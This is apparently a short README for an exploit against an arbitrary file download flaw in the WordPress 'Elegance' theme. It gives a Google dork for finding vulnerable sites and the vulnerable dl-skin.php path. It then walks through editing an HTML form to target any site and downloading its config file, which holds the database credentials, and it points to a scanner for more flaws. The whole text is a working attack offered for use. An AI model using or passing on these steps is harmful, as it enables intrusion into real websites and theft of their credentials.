Wordpress Theme Elegance Arbitrary File Download Vulnerability + Scanner

Google Dork:

    Dork: inurl:/wp-content/themes/elegance
    
Vuln Path:

    Path: /wp-content/themes/elegance/lib/scripts/dl-skin.php
    
How to use:

Edit line 18 from wp-conent.html and you wil see the code bellow

    Code: <form action="http://www.example.com/wp-content/themes/elegance/lib/scripts/dl-skin.php" method="POST">
    
Change the url name to the one that you want to exploit 

    Code: <form action="http://www.test.org/wp-content/themes/elegance/lib/scripts/dl-skin.php" method="POST">
    
Open wp-conent.html in your browser and click "Download"

	Note: You should get the wp-content file containg the SQL info for the WP site that you just exploited.

You can use the scanner to see other vulns that the site may or may note have

	Scanner Usage: python scan.py www.target.com


